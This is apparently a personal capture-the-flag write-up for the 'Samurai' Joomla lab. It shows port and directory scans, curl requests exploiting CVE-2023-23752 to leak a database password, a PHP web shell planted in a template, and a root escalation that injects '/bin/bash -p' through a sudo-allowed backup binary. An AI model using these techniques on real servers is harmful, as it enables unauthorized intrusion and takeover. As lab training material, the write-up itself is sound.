# Samurai (Easy)

Author

* Streetcoder

### Objective

As part of a penetration test, your team identified an interesting web server. Your task is to enumerate the target, establish an initial foothold, and escalate privileges to root.

My Notes for this short lab:



Rust scan recon, which uses Nmap built in:

```jsx
└─# rustscan -b 500 -a  10.1.130.216 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <http://discord.skerritt.blog>         :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
Port scanning: Because every port has a story to tell.

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 10.1.130.216:22
Open 10.1.130.216:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.1.130.216
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.99 ( <https://nmap.org> ) at 2026-05-01 11:05 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 11:05
Completed Parallel DNS resolution of 1 host. at 11:05, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 4, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:05
Scanning 10.1.130.216 [2 ports]
Discovered open port 22/tcp on 10.1.130.216
Discovered open port 80/tcp on 10.1.130.216
Completed SYN Stealth Scan at 11:05, 0.06s elapsed (2 total ports)
Initiating Service scan at 11:05
Scanning 2 services on 10.1.130.216
Completed Service scan at 11:05, 6.13s elapsed (2 services on 1 host)
NSE: Script scanning 10.1.130.216.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 1.63s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
Nmap scan report for 10.1.130.216
Host is up, received user-set (0.042s latency).
Scanned at 2026-05-01 11:05:32 EDT for 8s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c3:5a:83:50:80:9a:61:37:05:b7:45:96:cb:ab:1d:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDnWIbBLcbSbZZmw8nDh5DOA9ecneGMU8Ff1Rm8Frp71DcloANVhYkmErZ3+o839XNGO+k2tmXeNcwJ8jICj06M=
|   256 6b:15:12:60:1b:21:d1:bf:7e:b8:c0:e8:d7:7e:7b:6b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP9JIv57fNRXYSBb4BDtI+WNZG/hfJuGHaaMLL7Iu9PG
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 3E18B73692FF5A74F54EFFB2E047C8CB
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Samurai
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:05
Completed NSE at 11:05, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
```

![image.png](attachment:268bccac-aee1-4bc4-85a3-652ef1a7697a:image.png)

Basic website, however we should go into /etc/hosts and add the machine to it, so IP Address and then the name Samurai.hsl(Samurai Hack Smarter Labs)

We can use Ferrox buster to scan the webpage, as this is similar to gobuster and Dirbuster, its a little more modern, as we can see it finds us several interesting webpages to visit, and we want to turn our attention to the administrator sub-directory.

![image.png](attachment:fb454a8b-b356-475a-ad95-8c54791541f6:image.png)

```jsx
 
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Samurai Lab]
└─# feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u '<http://samurai.hsm/>' 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__
|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ <http://samurai.hsm/>
 🚩  In-Scope Url          │ samurai.hsm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      187l      370w     3185c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c <http://samurai.hsm/administrator> => <http://samurai.hsm/administrator/>
301      GET        9l       28w      308c <http://samurai.hsm/api> => <http://samurai.hsm/api/>
301      GET        9l       28w      311c <http://samurai.hsm/assets> => <http://samurai.hsm/assets/>
301      GET        9l       28w      310c <http://samurai.hsm/cache> => <http://samurai.hsm/cache/>
301      GET        9l       28w      315c <http://samurai.hsm/components> => <http://samurai.hsm/components/>
301      GET        9l       28w      311c <http://samurai.hsm/images> => <http://samurai.hsm/images/>
301      GET        9l       28w      313c <http://samurai.hsm/includes> => <http://samurai.hsm/includes/>
301      GET        9l       28w      313c <http://samurai.hsm/language> => <http://samurai.hsm/language/>
301      GET        9l       28w      312c <http://samurai.hsm/layouts> => <http://samurai.hsm/layouts/>
301      GET        9l       28w      310c <http://samurai.hsm/media> => <http://samurai.hsm/media/>
404      GET        1l        3w       54c <http://samurai.hsm/api/experiments/configurations>
404      GET        1l        3w       54c <http://samurai.hsm/api/experiments>
301      GET        9l       28w      312c <http://samurai.hsm/modules> => <http://samurai.hsm/modules/>
404      GET        1l        3w       54c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      312c <http://samurai.hsm/plugins> => <http://samurai.hsm/plugins/>
200      GET       65l      137w     3185c <http://samurai.hsm/cache/.git/HEAD>
200      GET        -l        -w     3185c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      316c <http://samurai.hsm/media/cache> => <http://samurai.hsm/media/cache/>
301      GET        9l       28w      314c <http://samurai.hsm/templates> => <http://samurai.hsm/templates/>
301      GET        9l       28w      308c <http://samurai.hsm/tmp> => <http://samurai.hsm/tmp/>
301      GET        9l       28w      327c <http://samurai.hsm/plugins/authentication> => <http://samurai.hsm/plugins/authentication/>
301      GET        9l       28w      319c <http://samurai.hsm/images/banners> => <http://samurai.hsm/images/banners/>
200      GET        1l        2w       31c <http://samurai.hsm/includes/index.html>
301      GET        9l       28w      319c <http://samurai.hsm/api/components> => <http://samurai.hsm/api/components/>
200      GET        1l        2w       31c <http://samurai.hsm/media/index.html>
301      GET        9l       28w      320c <http://samurai.hsm/plugins/captcha> => <http://samurai.hsm/plugins/captcha/>
200      GET        1l        2w       31c <http://samurai.hsm/cache/index.html>
[#################>--] - 51s   192054/223335  4s      found:25      errors:136963 
[#################>--] - 59s   199686/223335  4s      found:25      errors:137952 
[####################] - 2m    237588/237588  0s      found:25      errors:139144 
[####################] - 42s     4751/4751    113/s   <http://samurai.hsm/> 
[####################] - 50s     4751/4751    94/s    <http://samurai.hsm/administrator/> 
[####################] - 49s     4751/4751    96/s    <http://samurai.hsm/.git/logs/> 
[####################] - 50s     4751/4751    96/s    <http://samurai.hsm/api/> 
[####################] - 49s     4751/4751    97/s    <http://samurai.hsm/assets/> 
[####################] - 50s     4751/4751    96/s    <http://samurai.hsm/cache/> 
[####################] - 49s     4751/4751    97/s    <http://samurai.hsm/cgi-bin/> 
[####################] - 48s     4751/4751    99/s    <http://samurai.hsm/components/> 
[####################] - 48s     4751/4751    99/s    <http://samurai.hsm/assets/.git/logs/> 
[####################] - 47s     4751/4751    102/s   <http://samurai.hsm/cache/.git/logs/> 
[####################] - 47s     4751/4751    102/s   <http://samurai.hsm/cgi-bin/.git/logs/> 
[####################] - 60s     4751/4751    79/s    <http://samurai.hsm/assets/cgi-bin/> 
[####################] - 65s     4751/4751    73/s    <http://samurai.hsm/.git/logs/cgi-bin/> 
[####################] - 45s     4751/4751    105/s   <http://samurai.hsm/images/> 
[####################] - 44s     4751/4751    108/s   <http://samurai.hsm/includes/> 
[####################] - 45s     4751/4751    106/s   <http://samurai.hsm/language/> 
[####################] - 45s     4751/4751    106/s   <http://samurai.hsm/layouts/> 
[####################] - 43s     4751/4751    110/s   <http://samurai.hsm/media/> 
[####################] - 43s     4751/4751    109/s   <http://samurai.hsm/modules/> 
[####################] - 48s     4751/4751    99/s    <http://samurai.hsm/media/.git/logs/> 
[####################] - 43s     4751/4751    110/s   <http://samurai.hsm/administrator/.git/logs/> 
[####################] - 43s     4751/4751    111/s   <http://samurai.hsm/components/.git/logs/> 
[####################] - 42s     4751/4751    112/s   <http://samurai.hsm/cgi-bin/cgi-bin/> 
[####################] - 42s     4751/4751    114/s   <http://samurai.hsm/plugins/> 
[####################] - 41s     4751/4751    117/s   <http://samurai.hsm/media/cache/> 
[####################] - 62s     4751/4751    76/s    <http://samurai.hsm/media/cgi-bin/> 
[####################] - 52s     4751/4751    91/s    <http://samurai.hsm/includes/.git/logs/> 
[####################] - 42s     4751/4751    113/s   <http://samurai.hsm/includes/cgi-bin/> 
[####################] - 36s     4751/4751    131/s   <http://samurai.hsm/cache/cgi-bin/> 
[####################] - 36s     4751/4751    130/s   <http://samurai.hsm/modules/.git/logs/> 
[####################] - 52s     4751/4751    91/s    <http://samurai.hsm/administrator/cgi-bin/> 
[####################] - 34s     4751/4751    142/s   <http://samurai.hsm/templates/> 
[####################] - 35s     4751/4751    135/s   <http://samurai.hsm/tmp/> 
[####################] - 52s     4751/4751    91/s    <http://samurai.hsm/tmp/.git/logs/> 
[####################] - 33s     4751/4751    144/s   <http://samurai.hsm/images/banners/> 
[####################] - 29s     4751/4751    165/s   <http://samurai.hsm/components/cgi-bin/> 
[####################] - 22s     4751/4751    219/s   <http://samurai.hsm/plugins/authentication/> 
[####################] - 25s     4751/4751    190/s   <http://samurai.hsm/templates/.git/logs/> 
[####################] - 38s     4751/4751    124/s   <http://samurai.hsm/cache/cgi-bin/cgi-bin/> 
[####################] - 15s     4751/4751    316/s   <http://samurai.hsm/cgi-bin/cgi-bin/cgi-bin/> 
[####################] - 25s     4751/4751    187/s   <http://samurai.hsm/api/components/> 
[####################] - 51s     4751/4751    93/s    <http://samurai.hsm/plugins/captcha/> 
[####################] - 46s     4751/4751    103/s   <http://samurai.hsm/plugins/cgi-bin/> 
[####################] - 15s     4751/4751    315/s   <http://samurai.hsm/tmp/cgi-bin/> 
[####################] - 67s     4751/4751    71/s    <http://samurai.hsm/assets/cgi-bin/cgi-bin/> 
[####################] - 14s     4751/4751    334/s   <http://samurai.hsm/modules/cgi-bin/> 
[####################] - 47s     4751/4751    102/s   <http://samurai.hsm/layouts/cgi-bin/> 
[####################] - 43s     4751/4751    110/s   <http://samurai.hsm/plugins/cgi-bin/cgi-bin/> 
[####################] - 29s     4751/4751    164/s   <http://samurai.hsm/layouts/cgi-bin/cgi-bin/> 
[####################] - 33s     4751/4751    145/s   <http://samurai.hsm/plugins/captcha/cgi-bin/>  
```

we can visit “[http://samurai.hsm/administrator/”](http://samurai.hsm/administrator/%E2%80%9D)

and we are greeted with a joomla page

![image.png](attachment:d4419a73-d114-4431-8fc8-dfde6766872d:image.png)

Running a Joomscan it gives us some more information to go off of, and the version of Joomla that is in use by the machine is out of date, which as an attacker this is advantageous for us.

![image.png](attachment:b0a7bd81-540f-458b-8d42-e7b5d56e2504:image.png)

We can infer that Joomla 4.2.5 has a cve! we can use this to our advantage:

We can try this CVE-2023-23752

[https://www.exploit-db.com/raw/51334](https://www.exploit-db.com/raw/51334)

Ruby CVE-2023-23752.rb[http://samurai.hsm](http://samurai.hsm), when I tried to run it against this machine, the exploit did not work right, however after consulting a walkthrough it was much more simpler than I had thought it was.

Can do curl -s '[http://10.1.130.216/api/v1/users?public=true](http://10.1.130.216/api/v1/users?public=true)' to find whether a user is true or not.

![image.png](attachment:3c865ee9-12c5-48f8-998e-cd9164c49d70:image.png)

```jsx
</html>
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Samurai Lab]
└─# curl -s '<http://10.1.130.216/api/v1/users?public=true>'
{"links":{"self":"http:\\/\\/10.1.130.216\\/api\\/v1\\/users?public=true"},"data":[{"type":"users","id":"769","attributes":{"id":769,"name":"Oda","username":"Miyamoto","email":"oda@local.local","block":0,"sendEmail":1,"registerDate":"2026-03-06 09:02:33","lastvisitDate":null,"lastResetTime":null,"resetCount":0,"group_count":1,"group_names":"Super Users"}}],"meta":{"total-pages":1}}                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Samurai Lab]
└─# curl -s '<http://10.1.130.216/api/v1/config/application?public=true>' 
{"links":{"self":"http:\\/\\/10.1.130.216\\/api\\/v1\\/config\\/application?public=true","next":"http:\\/\\/10.1.130.216\\/api\\/v1\\/config\\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\\/\\/10.1.130.216\\/api\\/v1\\/config\\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Samurai","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"joomla425","id":224}},{"type":"application","id":"224","attributes":{"password":"Pa847word987@Joomla456","id":224}},{"type":"application","id":"224","attributes":{"db":"Dbjoomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"iemj4_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/Hack Smarter Labs/Samurai Lab]
└─# 
```

Miyamoto: :Pa847word987@Joomla456

Miyamoto login works!

![image.png](attachment:f5bd9b53-7a16-41db-ba3e-75a5c1164787:image.png)

We can now use a reverse shell and put it into the cassiopea template, we can use this as a way to get into the machine. for our reverse shell we will be using Penelope as it is more stable than netcat.

![image.png](attachment:47a98848-ae97-416a-ab63-0ccd473470a6:image.png)

Make sure to put: system(($\_GET\[’cmd’])));

or

\<?php if(isset($\_REQUEST\["cmd"])){ echo "\<pre>"; $cmd = ($\_REQUEST\["cmd"]); system($cmd); echo "\</pre>"; die; }?>

save the file

then check with this:

so curl -s ‘[http://samurai.hsm/administrator/?cmd=id’](http://samurai.hsm/administrator/?cmd=id%E2%80%99)

![image.png](attachment:e0e525b2-4eb0-4c7e-81bd-3ff2ae09758e:image.png)

we can use [penelope.py](http://penelope.py) as a shell to get into the machine as it is a little more stable than a normal netcat connection. We are given the www-data user. trying Sudo -l asks for a password so we should look for other avenues of escalation.

![image.png](attachment:f07c413d-7608-4dac-b7ce-b5f9d6ce61b1:image.png)

and it also gives us the user flag.txt if we continue on, we need to find a way to get to the Root user, we can use the strings command to find where the DBMaria file is.

Strings /opt/backup/DbMaria shows us this: We can use do Ls -lah /opt/dDbMaria

![image.png](attachment:16fed589-34f0-48a4-b88a-f86779b9efaf:image.png)

![image.png](attachment:2c30379a-c518-4a57-8420-ec128b008e4b:image.png)

We create the mariaDB-dump file. give it read and write permsissions. when I tried to run the mariadb-dump — socket=/run/mysqld/mysqld.sock -u root %s > /tmp/backup.sql what is happening is this file is trying to access permissions via a backup file via sql by giving us the user root permissions. we as an attacker can use sudo /opt/backup/DbMaria ‘test; /bin/bash -p #’

this command gives us the root/administrator user, and we can find the flag in the root folder on this machine.

![image.png](attachment:c62e0616-2a17-4f43-808a-f3be8396f505:image.png)

![image.png](attachment:40eb2050-75df-4fcc-bd82-a685124159da:image.png)
